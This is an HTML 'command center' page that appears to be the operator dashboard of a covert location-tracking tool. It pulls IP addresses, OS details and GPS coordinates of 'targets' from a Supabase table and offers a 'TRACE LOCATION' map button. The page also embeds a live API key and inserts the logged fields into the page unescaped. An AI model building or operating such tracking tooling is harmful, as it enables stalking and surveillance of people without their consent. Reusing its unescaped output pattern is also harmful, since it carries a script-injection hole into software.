<!DOCTYPE html>
<html>
<head>
    <title>PARDHAN Command Center</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 30px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .card { border: 1px solid #00ff41; padding: 20px; background: rgba(0,255,65,0.05); border-radius: 10px; }
        .map-btn { background: #00ff41; color: black; border: none; padding: 10px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; font-size: 32px; }
    </style>
</head>
<body>
    <h1>SYSTEM LOGS [PARDHAN-v4]</h1>
    <div id="logs" class="grid">Loading encrypted data...</div>

<script>
    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
    const supabase = window.supabase.createClient(SB_URL, SB_KEY);

    async function getLogs() {
        const { data } = await supabase.from('location_logs').select('*').order('created_at', { ascending: false });
        const cont = document.getElementById('logs');
        cont.innerHTML = "";
        data.forEach(l => {
            cont.innerHTML += `
                <div class="card">
                    <div><b>TARGET:</b> ${l.ip}</div>
                    <div><b>OS:</b> ${l.os_info}</div>
                    <div><b>COORD:</b> ${l.latitude}, ${l.longitude}</div>
                    <div><b>TIME:</b> ${new Date(l.created_at).toLocaleString()}</div>
                    <button class="map-btn" onclick="window.open('https://www.google.com/maps?q=${l.latitude},${l.longitude}')">TRACE LOCATION</button>
                </div>`;
        });
    }
    getLogs();
</script>
</body>
</html>
